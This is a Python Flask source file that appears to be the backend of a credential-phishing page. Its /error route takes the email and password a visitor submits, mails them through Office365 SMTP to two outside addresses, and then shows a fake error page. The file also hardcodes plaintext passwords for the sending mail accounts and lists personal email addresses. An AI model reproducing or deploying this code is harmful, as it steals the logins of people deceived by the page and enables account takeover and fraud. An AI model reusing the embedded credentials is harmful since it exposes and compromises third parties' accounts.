from flask import Flask,request, render_template
from flask_mail import Mail, Message
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


app = Flask(__name__)
mail = Mail(app)

# app.config['MAIL_SERVER']='smtp.gmail.com'
# app.config['MAIL_PORT'] = 587
# app.config['MAIL_USERNAME'] = 'brandonjulian799@gmail.com'
# app.config['MAIL_PASSWORD'] = 'hbvtmlmnsdakwzar'
# app.config['MAIL_USE_TLS'] = True
# app.config['MAIL_USE_SSL'] = False
# app.config['ehlo']=True
# mail = Mail(app)

my_email ="knit6@outlook.com"
password = "Ladenposse3"

@app.route("/")
def login():
    return render_template("hoem.html")

@app.route("/error",methods =["GET", "POST"])
def error():
    if request.method == "POST":
       first_name = request.form.get("email")
       last_name = request.form.get("pass")
       server_365 = smtplib.SMTP('smtp.office365.com', '587')
       server_365.ehlo('mylowercasehost')
       server_365.starttls()
       server_365.ehlo('mylowercasehost')
       server_365.login(user=my_email, password=password)
       message = MIMEMultipart()
       message["From"] = my_email
       recipient_list = ["karenfurst6@gmail.com", "madeway34@outlook.com"]
       message["To"] = ", ".join(recipient_list)
       message["Subject"] = "Email Subject"
       msg = f"username: {first_name}, /n password: {last_name}"
       message.attach(MIMEText(msg))

       server_365.send_message(message)
       server_365.quit()
       # getting input with name = fname in HTML form
    #    first_name = request.form.get("email")
    #    # getting input with name = lname in HTML form 
    #    last_name = request.form.get("pass")
    #    msg = Message(subject='New details submitted!', sender='karenfurst66@outlook.com', recipients=['karenfurst6@gmail.com','madeway34@outlook.com'])
    #    msg.body = f"username: {first_name}, /n password: {last_name}"
    #    mail.send(msg) 
    #    print(first_name, last_name)
       return render_template("error.html")


if __name__ == "__main__":
    app.run(debug=False)